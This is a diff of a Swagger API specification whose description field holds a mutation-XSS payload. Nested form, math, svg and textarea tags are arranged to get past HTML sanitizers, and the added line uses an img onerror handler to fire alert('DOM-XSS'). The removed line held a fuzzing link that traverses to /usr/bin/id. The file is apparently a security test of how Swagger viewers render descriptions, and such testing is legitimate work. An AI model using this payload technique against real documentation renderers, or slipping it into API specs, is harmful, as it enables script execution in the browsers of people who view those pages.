@@ -2,7 +2,7 @@ swagger: '2.0'
 info: 
   title: YUDoThisCELFOCUS | Z'R0 
   description: | 
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><a href="file:\\..\..\..\..\..\..\usr\bin\id" id="fuzzelement1">test</a>"></form> 
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('DOM-XSS') src=1>"></form> 
   version: production 
 basePath: /JSSResource/
 produces: 
